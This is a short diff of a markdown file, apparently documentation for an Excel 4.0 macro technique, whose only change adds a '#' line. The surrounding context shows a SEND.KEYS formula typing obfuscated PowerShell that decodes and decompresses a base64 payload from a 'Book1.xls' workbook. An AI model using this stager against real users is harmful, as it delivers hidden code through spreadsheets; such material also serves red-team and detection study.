@@ -52,6 +52,8 @@ Example:
 =SEND.KEYS("IO.Compression.GZipStream{(}{(}no IO.MemoryStream -A @{(},{[}Convert{]}::FromBase64String{(}$b{)}{)}{)},{[}IO.Compression.CompressionMode{]}::Decompress{)}{)}{)}.ReadToEnd{(}{)}~{NUMLOCK}"; TRUE)
 ```
 
+#
+
 ``Book1.xls`` breakdown:
 
 ![](breakdown.png)
